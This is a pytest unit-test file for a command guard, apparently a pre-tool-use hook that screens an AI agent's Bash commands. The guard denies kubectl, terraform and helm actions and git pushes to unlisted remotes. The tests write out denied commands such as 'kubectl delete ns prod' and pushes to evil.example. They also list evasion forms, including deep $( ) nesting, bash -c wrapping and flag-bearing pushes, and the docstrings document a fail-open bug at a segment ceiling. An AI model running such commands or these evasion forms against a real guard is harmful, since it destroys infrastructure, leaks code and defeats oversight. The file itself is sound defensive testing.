"""Unit tests for the guard's analyzer (charter C-1/C-5).

tests/governance/test_pretooluse_guard.py drives the real bash wrapper end to
end — that is the integration proof. These tests exercise the classification
logic directly, so a tokenizer regression is diagnosed in milliseconds and at
the level it occurred, instead of as a rc=0 from a subprocess.
"""

from __future__ import annotations

import io
from pathlib import Path
from typing import Final

import pytest

from orbital_drift import guard

#: A command the deny-list forbids in EVERY mode. Used as the payload wherever
#: a test has to prove the analyzer actually READ what it was asked to judge —
#: a verdict of "not blocked" means nothing unless the denied verb was in scope.
_DENIED: Final = "kubectl delete ns prod"

#: Deepest `$( )` nesting `split_segments` can still fully unwrap.
#:
#: Each level costs TWO queue iterations: the lifted body is queued AND the
#: stripped remainder is re-queued (guard.py's `continue`). The queue is LIFO,
#: so the body lifted on the FIRST pass — the one holding the real command —
#: lands at the bottom and is popped LAST, on iteration ``2 * depth + 1``. The
#: split is therefore complete only while ``2 * depth + 1 <= _MAX_SEGMENTS``,
#: which is where both constants below come from rather than from a literal.
#:
#: Measured 2026-08-22 at the ceiling of 512, BEFORE the fail-closed fix
#: (RB-009): depth 255 -> 1 segment -> BLOCK (C-1); depth 256 -> 0 segments ->
#: ALLOW, and the wrapper exited 0 for a command denied in every mode.
_LAST_ANALYZABLE_DEPTH: Final = (guard._MAX_SEGMENTS - 1) // 2

#: First depth at which the ceiling stops the split with work still queued.
_TRUNCATING_DEPTH: Final = _LAST_ANALYZABLE_DEPTH + 1

#: Well past the boundary, to show the verdict does not depend on landing
#: exactly on it. Twice the first truncating depth, not an arbitrary offset.
_WELL_PAST_TRUNCATING_DEPTH: Final = _TRUNCATING_DEPTH * 2

#: Most SIBLING (unnested) substitutions one command line can carry and still
#: be split completely. A single pass lifts all N bodies and re-queues the
#: stripped remainder, so the whole split costs ``N + 2`` iterations: one to
#: lift, one for the remainder, one per body. Complete while
#: ``N + 2 <= _MAX_SEGMENTS``. Measured 2026-08-22: N=510 -> 512 iterations,
#: queue drained, 511 segments, NOT truncated; N=511 -> truncated.
_LAST_COMPLETE_SIBLINGS: Final = guard._MAX_SEGMENTS - 2

#: First sibling count that leaves work queued at the ceiling.
_TRUNCATING_SIBLINGS: Final = _LAST_COMPLETE_SIBLINGS + 1


def _nested(command: str, depth: int) -> str:
    """``command`` buried under ``depth`` levels of command substitution."""
    return "$(" * depth + command + ")" * depth


@pytest.fixture
def allowlist(tmp_path: Path) -> Path:
    path = tmp_path / "allowed-remotes.txt"
    path.write_text(
        "# charter C-5 / DEC-003\nhttps://github.com/ianshank/Orbital-Drift.git\n",
        encoding="utf-8",
    )
    return path


def _blocked(command: str, allowlist: Path, *, remote: str = "") -> guard.Verdict:
    return guard.analyze(command, allowlist=allowlist, effective_remote=remote)


# --- segmentation ----------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("a && b", {"a", "b"}),
        ("a || b", {"a", "b"}),
        ("a ; b", {"a", "b"}),
        ("a | b", {"a", "b"}),
        ("a & b", {"a", "b"}),
        ("a\nb", {"a", "b"}),
        # Substitution bodies are lifted into their own segments: this is the
        # class of bypass the regex tokenizer could not see at all.
        ("echo $(kubectl get pods)", {"echo", "kubectl get pods"}),
        ("echo `kubectl get pods`", {"echo", "kubectl get pods"}),
        ("a $(b $(c))", {"a", "b", "c"}),
    ],
)
def test_split_segments(command: str, expected: set[str]) -> None:
    assert set(guard.split_segments(command)) >= expected


def test_parameter_expansion_is_data_not_a_command() -> None:
    """${VAR} expands to a value; it is not a nested command line."""
    assert "VAR" not in " ".join(guard.split_segments("echo ${VAR}"))


# --- classification --------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "kubectl get pods",
        "argo list",
        "argocd app list",
        "k3s kubectl get nodes",
        "k9s",
        "/usr/local/bin/kubectl apply -f x",
        "sudo kubectl apply -f x",
        "env KUBECONFIG=/tmp/c kubectl apply -f x",
        "FOO=1 BAR=2 kubectl apply -f x",
        "xargs kubectl delete pod",
    ],
)
def test_always_denied_commands_block(command: str, allowlist: Path) -> None:
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict


@pytest.mark.parametrize(
    "command",
    [
        "helm install r ./c",
        "helm upgrade r ./c",
        "helm get values r",
        "terraform apply",
        "terraform plan",
        "terraform init",  # no -backend=false: initializes a real backend
        "kustomize build overlays/prod",
    ],
)
def test_conditional_commands_block_outside_readonly_forms(command: str, allowlist: Path) -> None:
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict


@pytest.mark.parametrize(
    "command",
    [
        "helm template ./chart",
        "helm template . --set a=b",
        "helm lint ./chart",
        "terraform validate",
        "terraform fmt -check",
        "terraform init -backend=false",
        "pytest -q",
        "git status",
        "ls -la",
        # Substitutions in ORDINARY use. Without these the suite could not tell
        # a working analyser from one that refuses every command carrying a
        # `$( )` at all — the fail-closed fix must not become a blanket ban.
        "echo $(git rev-parse HEAD)",
        "cd $(git rev-parse --show-toplevel) && pytest -q",
        "make pre-pr 2>&1 | tee /tmp/`date +%s`.log",
    ],
)
def test_permitted_commands_allow(command: str, allowlist: Path) -> None:
    assert not _blocked(command, allowlist).blocked


def test_unparseable_segment_fails_closed(allowlist: Path) -> None:
    verdict = _blocked('echo "unterminated', allowlist)
    assert verdict.blocked
    assert "tokenize" in verdict.reason


# --- shell -c recursion ----------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        'bash -c "kubectl apply -f x"',
        "sh -c 'terraform apply'",
        "bash -c \"sh -c 'kubectl delete ns prod'\"",
        'zsh -c "helm install r ./c"',
    ],
)
def test_shell_dash_c_payloads_are_analyzed_as_code(command: str, allowlist: Path) -> None:
    assert _blocked(command, allowlist).blocked


def test_shell_dash_c_with_safe_payload_allows(allowlist: Path) -> None:
    assert not _blocked('bash -c "pytest -q"', allowlist).blocked


def test_deep_nesting_refuses_rather_than_recursing(allowlist: Path) -> None:
    command = "echo hi"
    for _ in range(guard._MAX_DEPTH + 2):
        command = f'bash -c "{command}"'
    verdict = guard.analyze(command, allowlist=allowlist, _depth=guard._MAX_DEPTH + 1)
    assert verdict.blocked


# --- git push destinations -------------------------------------------------


def test_allowlisted_push_allows(allowlist: Path) -> None:
    assert not _blocked(
        "git push https://github.com/ianshank/Orbital-Drift.git main", allowlist
    ).blocked


def test_unlisted_push_blocks(allowlist: Path) -> None:
    verdict = _blocked("git push https://evil.example/x.git main", allowlist)
    assert verdict.blocked and verdict.constraint == "C-5"


@pytest.mark.parametrize(
    "command",
    [
        "git -C /somewhere push evil main",
        "git --exec-path=/usr/lib push evil",
        "git -c user.name=x push evil",
    ],
)
def test_flag_bearing_push_forms_are_still_checked(command: str, allowlist: Path) -> None:
    """Every one of these was measured ALLOWED by the regex implementation."""
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-5", verdict


def test_bare_push_uses_the_effective_remote(allowlist: Path) -> None:
    allowed = _blocked(
        "git push", allowlist, remote="https://github.com/ianshank/Orbital-Drift.git"
    )
    assert not allowed.blocked
    denied = _blocked("git push", allowlist, remote="https://evil.example/x.git")
    assert denied.blocked


def test_bare_push_with_no_resolvable_remote_blocks(allowlist: Path) -> None:
    """Never assume `origin`: assuming a default is how a push to an
    off-allowlist remote.pushDefault was measured to pass."""
    verdict = _blocked("git push", allowlist, remote="")
    assert verdict.blocked and verdict.constraint == "C-5"


def test_push_flags_are_skipped_when_finding_the_destination(allowlist: Path) -> None:
    verdict = _blocked("git push --force-with-lease https://evil.example/x.git main", allowlist)
    assert verdict.blocked and verdict.constraint == "C-5"


def test_missing_allowlist_fails_closed(tmp_path: Path) -> None:
    verdict = _blocked(
        "git push https://github.com/ianshank/Orbital-Drift.git", tmp_path / "no.txt"
    )
    assert verdict.blocked and verdict.constraint == "C-5"


def test_non_push_git_commands_allow(allowlist: Path) -> None:
    for command in ("git status", "git commit -m 'x'", "git -C /tmp log --oneline"):
        assert not _blocked(command, allowlist).blocked, command


def test_quoted_mention_is_data(allowlist: Path) -> None:
    """A quoted string reaching `git commit -m` is data; the identical string
    reaching `bash -c` is code and blocks (see the -c tests above)."""
    assert not _blocked('git commit -m "kubectl apply -f x.yaml"', allowlist).blocked


def test_verdict_renders_its_constraint(allowlist: Path) -> None:
    verdict = _blocked("kubectl apply -f x", allowlist)
    assert verdict.render().startswith("BLOCKED (C-1)")
    assert guard.Verdict(False).render() == "ALLOW"


# --- main(): the CLI boundary ----------------------------------------------
#
# The bash wrapper is covered end-to-end by tests/governance, but coverage.py
# cannot see a subprocess-spawned interpreter, so main()'s branches are
# exercised directly here too.


def _payload(command: str) -> str:
    import json

    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})


def test_main_allows_benign(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("pytest -q")))
    assert guard.main(["--allowlist", str(allowlist)]) == 0
    assert capsys.readouterr().err == ""


def test_main_blocks_and_names_the_constraint(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("kubectl apply -f x")))
    assert guard.main(["--allowlist", str(allowlist)]) == 2
    assert "BLOCKED (C-1)" in capsys.readouterr().err


def test_main_empty_command_allows(allowlist: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("")))
    assert guard.main(["--allowlist", str(allowlist)]) == 0


def test_main_unanalyzable_dangerous_payload_fails_closed(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO("not json -- kubectl delete ns prod"))
    assert guard.main(["--allowlist", str(allowlist)]) == 2
    assert "unanalyzable payload" in capsys.readouterr().err


def test_main_unanalyzable_benign_payload_allows(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO("not json -- echo hello"))
    assert guard.main(["--allowlist", str(allowlist)]) == 0


def test_main_debug_traces_segments(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("echo a && echo b")))
    assert guard.main(["--allowlist", str(allowlist), "--debug"]) == 0
    assert "guard: segment=" in capsys.readouterr().err


def test_main_passes_the_effective_remote_through(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("git push")))
    blocked = guard.main(["--allowlist", str(allowlist), "--effective-remote", "https://evil/x"])
    assert blocked == 2
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("git push")))
    allowed = guard.main(
        [
            "--allowlist",
            str(allowlist),
            "--effective-remote",
            "https://github.com/ianshank/Orbital-Drift.git",
        ]
    )
    assert allowed == 0


# --- the segment work ceiling (RB-009) -------------------------------------
#
# `split_segments` stops at _MAX_SEGMENTS. Everything below pins the one thing
# that matters when it does: a command the segmenter could not finish reading
# is UNANALYSED, and an unanalysed command must never read as permission.
# Measured 2026-08-22 before the fix, `analyze` returned ALLOW for a payload
# whose only content was a command denied in every mode.


def test_segment_queue_has_a_work_ceiling(allowlist: Path) -> None:
    """A pathological input must terminate rather than spin — and it must come
    back BLOCKED, because a split that stopped early proves nothing about the
    part it never read.

    The two assertions this replaces (``isinstance(..., list)`` and
    ``is not None``) were unfalsifiable: they held with ``_MAX_SEGMENTS`` at
    10**9, and they held while this very input was being ALLOWED. The payload
    is deliberately BENIGN — refusing to analyse *is* the verdict, so the
    accepted false positive is pinned here rather than met in an incident.

    A THIRD unfalsifiable assertion lived here until now, and it is the reason
    the two below are EXACT-STATE rather than a bound. MEASURED 2026-08-22 at
    11af312, in a scratch COPY of this tree: ``len(split_segments(payload)) <=
    _MAX_SEGMENTS`` evaluates True with the ceiling deleted outright (1
    segment), with the split hard-wired to return nothing (0), and with a junk
    segment appended on every drain (256). It compares the wrong two
    quantities: ``_MAX_SEGMENTS`` bounds queue ITERATIONS, not segments, and
    for a nested payload the segment count never comes near it. The comparison
    is not even conservatively true: the ``;``-chain test below returns
    ``_MAX_SEGMENTS + 1`` segments from a command the guard read in FULL. So it
    is a bound that neither holds in general nor can fail on this payload.

    EXACT STATE EITHER SIDE OF THE BOUNDARY is what carries the property, and
    both depths are derived from ``_MAX_SEGMENTS`` rather than chosen, so the
    pair keeps straddling the boundary if the ceiling moves. Same three
    mutations, same scratch copy: deleting the ceiling makes the truncating
    depth split to ``["echo hi"]`` (the second assertion reddens); discarding
    the segments empties the readable depth (the first reddens); appending junk
    reddens both. NEITHER is redundant with the verdict assertion that follows
    — under the discard and junk mutations the split is still reported
    truncated, so the C-1 BLOCK below still arrives and this test would stay
    green on the strength of a segmenter returning pure garbage.

    The PUBLIC ``split_segments`` is used deliberately, not the checked
    ``_split_segments`` that
    ``test_split_segments_reports_truncation_to_policy_callers`` drives: this
    is the return shape whose invisible truncation caused RB-009, so what it
    returns at each side of the ceiling is worth pinning in its own right.
    """
    readable = _nested("echo hi", _LAST_ANALYZABLE_DEPTH)
    pathological = _nested("echo hi", _TRUNCATING_DEPTH)

    assert guard.split_segments(readable) == ["echo hi"], (
        f"at depth {_LAST_ANALYZABLE_DEPTH} the split is complete and must unwrap to "
        "exactly the innermost command; anything else means the segmenter is losing or "
        "inventing segments below the ceiling"
    )
    assert guard.split_segments(pathological) == [], (
        f"at depth {_TRUNCATING_DEPTH} the ceiling stops the queue before the innermost "
        "body is ever popped, so nothing should have drained; a non-empty result here "
        "means this payload is no longer truncating and the test has stopped testing "
        "the ceiling"
    )

    verdict = guard.analyze(pathological, allowlist=allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict


@pytest.mark.parametrize("depth", [_TRUNCATING_DEPTH, _WELL_PAST_TRUNCATING_DEPTH])
def test_truncated_analysis_fails_closed(depth: int, allowlist: Path) -> None:
    """The measured fail-open: the ceiling was reached before the denied verb
    was ever popped off the queue, so `analyze` iterated an empty list, fell
    through every check and allowed a command the deny-list forbids outright.
    """
    verdict = _blocked(_nested(_DENIED, depth), allowlist)
    assert verdict.blocked, f"depth {depth} was ALLOWED — the guard failed open"
    assert verdict.constraint == "C-1", verdict
    assert "ceiling" in verdict.reason, verdict.reason


@pytest.mark.parametrize("depth", [1, _LAST_ANALYZABLE_DEPTH])
def test_below_the_ceiling_the_command_is_still_read(depth: int, allowlist: Path) -> None:
    """No regression, and no false comfort: under the ceiling the BLOCK must
    still come from finding the denied verb, not from refusing to look. Without
    this, a fix that blocked every nested payload outright would look identical
    to a working analyser.
    """
    verdict = _blocked(_nested(_DENIED, depth), allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict
    assert "denied in every mode" in verdict.reason, verdict.reason
    assert "ceiling" not in verdict.reason, verdict.reason


def test_wide_substitution_fan_out_also_fails_closed(allowlist: Path) -> None:
    """Same defect, no nesting at all, and a PARTIAL split rather than an empty
    one — so a fix keyed on "no segments" would not close it.

    One pass lifts every sibling substitution onto the queue, which is LIFO, so
    the leftmost body is popped last. Put the denied command first, follow it
    with enough harmless substitutions to reach `_TRUNCATING_SIBLINGS`, and it
    is never reached. Measured 2026-08-22 pre-fix: 511 segments, verdict ALLOW.
    """
    command = f"echo $({_DENIED}) " + "$(echo x) " * (_TRUNCATING_SIBLINGS - 1)
    verdict = _blocked(command, allowlist)
    assert verdict.blocked, "a partially-read command was ALLOWED"
    assert verdict.constraint == "C-1", verdict
    assert "ceiling" in verdict.reason, verdict.reason


def test_a_benign_command_with_many_segments_is_still_allowed(allowlist: Path) -> None:
    """SEGMENT COUNT IS NOT THE CEILING — the ceiling counts queue iterations.

    A `;`-chain of N commands is split in a single pass, so it costs one
    iteration no matter how long it is. This chain yields MORE segments than
    `_MAX_SEGMENTS` itself and must still be judged on its contents and
    allowed. Without this the fix could tighten into `len(segments) > k` and
    nothing would notice: an unread command and a long-but-fully-read one are
    opposite states, and only one of them is a refusal.
    """
    count = guard._MAX_SEGMENTS + 1
    chain = "; ".join("echo x" for _ in range(count))
    segments, truncated = guard._split_segments(chain)
    assert truncated is False, "a fully-split chain was reported truncated"
    assert len(segments) == count
    assert not guard.analyze(chain, allowlist=allowlist).blocked


def test_split_segments_reports_truncation_to_policy_callers() -> None:
    """The checked form exists to tell "nothing to object to" apart from "never
    looked" — the distinction the public list return shape cannot express, and
    the reason the fail-open survived review.
    """
    segments, truncated = guard._split_segments("echo a && echo b")
    assert truncated is False
    assert set(segments) == {"echo a", "echo b"}

    partial, truncated = guard._split_segments(_nested(_DENIED, _TRUNCATING_DEPTH))
    assert truncated is True
    assert partial == [], f"the denied body should never have been reached: {partial}"

    # THE EXACT-DRAIN CASE, which is the whole reason the flag is the QUEUE and
    # not the iteration count. `_LAST_COMPLETE_SIBLINGS` bodies consume the
    # ceiling to the last iteration and leave nothing queued: the split IS
    # complete, so reporting it truncated would refuse a command the guard read
    # in full. A count-based flag (`guard_rail >= _MAX_SEGMENTS`) passes every
    # other assertion in this file and fails only here.
    drained, truncated = guard._split_segments("echo " + "$(echo x) " * _LAST_COMPLETE_SIBLINGS)
    assert truncated is False, "a complete split that used the last iteration was called truncated"
    assert drained == ["echo"] + ["echo x"] * _LAST_COMPLETE_SIBLINGS


def test_the_ceiling_is_read_from_the_constant_not_a_literal(
    monkeypatch: pytest.MonkeyPatch,
    allowlist: Path,
) -> None:
    """The bound is ``_MAX_SEGMENTS`` itself, not a same-valued literal.

    Every other test above derives its depths FROM ``guard._MAX_SEGMENTS``, so
    all of them describe the ceiling's current value and none of them describe
    where the loop gets it. MEASURED 2026-08-22 at 9de5a0e, in a scratch COPY of
    the tree rather than in the tree under review: rewriting the loop condition
    to ``guard_rail < 512`` — the identical value, hand-copied — leaves this
    whole file green (76 passed), because nothing changes at the shipped
    ceiling. That is the single-home defect RB-008 exists to catch, and it is
    the mutation this test adds: lower the constant and the same payload must
    change verdict.

    ``_LAST_ANALYZABLE_DEPTH`` is chosen deliberately —
    ``test_below_the_ceiling_the_command_is_still_read`` already pins that this
    exact depth is read IN FULL at the shipped ceiling, so a truncated result
    here can only be the lowered constant taking effect.

    The unpatched ALLOW is asserted FIRST, and it is not decoration. Nothing
    else in this suite pins that a benign, deeply-nested, BELOW-ceiling command
    is allowed: the substitution cases in ``test_permitted_commands_allow`` and
    the wrapper's ``ALLOWED`` corpus are depth 1, and
    ``test_a_benign_command_with_many_segments_is_still_allowed`` is a
    ``;``-chain with no nesting at all. Every other deep payload here carries a
    DENIED verb or sits above the ceiling, so all of them turn on a BLOCK.
    Without the assertion below, a regression that refused readable deep
    payloads for some reason OTHER than truncation would pass this whole file —
    and refusing legitimate work is the failure mode this guard is least able to
    notice about itself.
    """
    payload = _nested("echo hi", _LAST_ANALYZABLE_DEPTH)
    assert guard.analyze(payload, allowlist=allowlist) == guard.Verdict(
        blocked=False, constraint="", reason="", segment=""
    ), "a readable deep payload must be judged on its contents, not refused"

    monkeypatch.setattr(guard, "_MAX_SEGMENTS", 8)

    segments, truncated = guard._split_segments(payload)
    assert truncated is True, (
        "with the ceiling lowered to 8 this payload must come back truncated; "
        "it did not, so the loop is not bounded by _MAX_SEGMENTS at all"
    )
    assert segments == [], f"the queue was cut short, so nothing should have drained: {segments}"


def test_excerpt_is_lossless_below_the_bound_and_says_so_above_it() -> None:
    """A diagnostic must not quietly shorten a command that fits.

    In practice only huge commands reach the truncation block — the shortest
    input that can truncate is ~775 characters — so the short branch is
    defensive. Pinned anyway: the day this helper is reused for a segment or a
    push destination, silently dropping the tail would be a real defect.
    """
    short = "echo hi"
    assert guard._excerpt(short) == short

    long_command = "x" * (guard._EXCERPT_CHARS + 500)
    rendered = guard._excerpt(long_command)
    assert rendered.startswith("x" * guard._EXCERPT_CHARS)
    assert len(rendered) < len(long_command)
    assert "500 more characters" in rendered, rendered


def test_truncation_verdict_shows_the_operator_a_bounded_excerpt(allowlist: Path) -> None:
    """Every other block in this module names the segment it objected to; the
    truncation block has no segment to name, so it quotes the COMMAND instead —
    bounded, because the payloads that reach it are kilobytes long and this
    string is written to an operator's stderr.

    THE RENDER ASSERTION IS THE LOAD-BEARING ONE. `Verdict.render()` formats
    the constraint and the reason and nothing else, and `main()` writes
    `render()`; every other block gets its segment onto stderr by putting it IN
    the reason (`...; segment: {segment}`). So a populated `.segment` that no
    reason interpolates is invisible, and a test asserting only the field would
    pass while the operator saw nothing — a decorative assertion about a
    decorative field.
    """
    command = _nested(_DENIED, _TRUNCATING_DEPTH)
    verdict = _blocked(command, allowlist)
    assert verdict.segment, "the truncation block names nothing at all"
    assert command.startswith(verdict.segment[:40]), verdict.segment
    assert len(verdict.segment) < len(command), "the whole payload was echoed back"
    assert len(verdict.segment) <= guard._EXCERPT_CHARS + 60, len(verdict.segment)

    rendered = verdict.render()
    assert verdict.segment in rendered, (
        "the excerpt never reaches stderr — main() writes render(), which "
        f"formats constraint + reason only. rendered was: {rendered}"
    )
    assert len(rendered) < len(command), "render() echoed the whole payload back"


def test_main_debug_reports_truncation(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """GUARD_DEBUG must not go silent in the one case it is most needed.

    The public `split_segments` returns an EMPTY list for a truncating payload,
    so tracing through it printed the verdict and not one `guard: segment=`
    line — the operator saw a block with no evidence, which is the same
    invisible truncation that caused RB-009 in the first place.
    """
    monkeypatch.setattr(
        "sys.stdin", io.StringIO(_payload(_nested(_DENIED, _WELL_PAST_TRUNCATING_DEPTH)))
    )
    assert guard.main(["--allowlist", str(allowlist), "--debug"]) == 2
    err = capsys.readouterr().err
    assert "guard: TRUNCATED" in err, err[:400]
    assert "BLOCKED (C-1)" in err
